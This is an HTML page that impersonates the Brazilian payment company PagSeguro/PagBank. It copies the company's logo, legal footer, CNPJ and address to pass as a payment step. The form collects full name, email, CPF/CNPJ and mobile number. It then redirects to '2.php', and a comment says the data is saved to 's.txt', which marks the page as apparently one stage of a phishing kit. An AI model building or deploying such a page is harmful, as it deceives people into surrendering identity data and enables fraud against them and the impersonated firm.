<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUdRAHBK7sJSGF5-fDYgEvDKCCYN60Kh9vQA&usqp=CAU">
    <title>PagSeguro</title>
    
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            min-height: 100vh; /* Adjusted to ensure full height */
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            overflow: hidden;
        }
        header {
            width: 100%;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        header img {
            width: 100%;
            height: auto;
            display: block;
        }
        .rectangle {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            overflow: hidden;
        }
        .rectangle img {
            width: 100%;
            height: auto;
            display: block;
        }
        .square {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            border: 2px solid #ccc;
            background-color: rgba(255, 255, 255, 0.5);
            position: relative;
            display: flex;
            flex-direction: column; /* Updated to display fields vertically */
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .field {
            width: 100%;
            margin-bottom: 15px; /* Adjusted margin between fields */
        }
        .field input {
            width: 100%;
            box-sizing: border-box;
            padding: 10px;
            border: 2px solid #999; /* Adjusted to gray */
            border-radius: 5px;
            transition: border-color 0.3s;
            font-size: 16px; /* Increased font size */
        }
        .field input.invalid {
            border-color: #999; /* Changed to dark gray */
        }
        .field label {
            color: #555;
            font-size: 16px; /* Increased font size */
            margin-bottom: 5px;
            display: block;
        }
        .button {
            width: 100%;
            background-color: #7db7d8;
            color: white;
            padding: 15px 20px; /* Increased padding */
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px; /* Increased font size */
        }
        .button-text {
            color: black;
            font-size: 14px; /* Decreased font size */
            margin: 5px 0; /* Adjusted margin */
        }
        .blue-text {
            color: blue;
        }
        footer {
            background-color: black;
            color: white;
            padding: 15px; /* Adjusted padding */
            text-align: center;
            margin-top: 10px; /* Adjusted margin */
        }
    </style>
    <script>
        function saveAndRedirect() {
            // Get input values
            var fullName = document.getElementById("fullName").value;
            var email = document.getElementById("email").value;
            var cpfCnpj = document.getElementById("cpfCnpj").value;
            var phone = document.getElementById("phone").value;

            // Validate if all fields are filled
            if (fullName && email && cpfCnpj && phone) {
                // Save data to s.txt (Assuming you have a server-side script to handle this)
                // You may need to use AJAX or other methods depending on your server setup

                // Redirect to 2.php
                window.location.href = '2.php';
            } else {
                alert('Por favor, preencha todos os campos.');
                // Highlight missing fields
                if (!fullName) document.getElementById("fullName").classList.add("invalid");
                else document.getElementById("fullName").classList.remove("invalid");

                if (!email) document.getElementById("email").classList.add("invalid");
                else document.getElementById("email").classList.remove("invalid");

                if (!cpfCnpj) document.getElementById("cpfCnpj").classList.add("invalid");
                else document.getElementById("cpfCnpj").classList.remove("invalid");

                if (!phone) document.getElementById("phone").classList.add("invalid");
                else document.getElementById("phone").classList.remove("invalid");
            }
        }

        function formatCpfCnpj() {
            var input = document.getElementById("cpfCnpj");
            var value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
            if (value.length <= 11) {
                // Format CPF (11 digits)
                input.value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            } else {
                // Format CNPJ (14 digits)
                input.value = value.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, '$1.$2.$3/$4-$5');
            }
        }
    </script>
</head>
<body>

    <div class="container">
        <header>
            <img src="https://i.postimg.cc/CMqc6Qdc/Picsart-23-11-11-12-01-37-242.jpg" alt="Cabeçalho">
        </header>

        <!-- Rectangle below the header -->
        <div class="rectangle">
            <img src="https://i.postimg.cc/k4LCpKjh/1.jpg" alt="Retângulo">
        </div>

        <!-- Square between the rectangle and footer -->
        <div class="square">
            <div class="field">
                <label for="fullName">Nome Completo</label>
                <input type="text" id="fullName" name="fullName" class="invalid" oninput="this.classList.remove('invalid');">
            </div>
            <div class="field">
                <label for="email">E-mail</label>
                <input type="email" id="email" name="email" class="invalid" oninput="this.classList.remove('invalid');">
            </div>
            <div class="field">
                <label for="cpfCnpj">CPF CNPJ</label>
                <input type="text" id="cpfCnpj" name="cpfCnpj" class="invalid" oninput="formatCpfCnpj(); this.classList.remove('invalid');">
            </div>
            <div class="field">
                <label for="phone">Celular</label>
                <input type="tel" id="phone" name="phone" class="invalid" oninput="this.classList.remove('invalid');" pattern="[0-9]*">
            </div>
            <button class="button" onclick="saveAndRedirect()">
                <span class="button-text">Continuar</span>
            </button>
            <p class="button-text">
                Pagamento processado pelo PagBank. <span class="blue-text">Saiba mais</span> | Protegido por reCAPTCHA. <span class="blue-text">Privacidade e Termos de Serviço.</span>
            </p>
        </div>

        <!-- Conteúdo do site pode ser adicionado aqui -->

        <footer>
            <div class="_2EmXf">
                <link itemprop="url" href="https://pagseguro.uol.com.br/">
                <link itemprop="logo" href="https://assets.pagseguro.com.br/payment-collector/v15.95.0/_next/static/0fee79b7d42d1707491572397b85ecdc.svg">
                <img width="102" height="28" src="https://assets.pagseguro.com.br/payment-collector/v15.95.0/_next/static/0fee79b7d42d1707491572397b85ecdc.svg" alt="PagBank" class="MEWVI">
                <div class="_3OkSp">
                    <p>© 1996-2023 Todos os direitos reservados.</p>
                    <p><span itemprop="name">PAGSEGURO INTERNET INSTITUIÇÃO DE PAGAMENTO S/A</span> - CNPJ/MF 08.561.701/0001-01</p>
                    <p itemtype="http://schema.org/PostalAddress" itemprop="location">
                        <span itemprop="streetAddress">&nbsp;Av. Brigadeiro Faria Lima, 1.384</span>,
                        <span itemprop="addressLocality">São Paulo</span> - <span itemprop="addressRegion">SP</span> - CEP<span itemprop="postalCode"> 01451-001</span>
                        <meta itemprop="addressCountry" content="BR">
                    </p>
                </div>
            </div>
        </footer>
    </div>

</body>
</html>
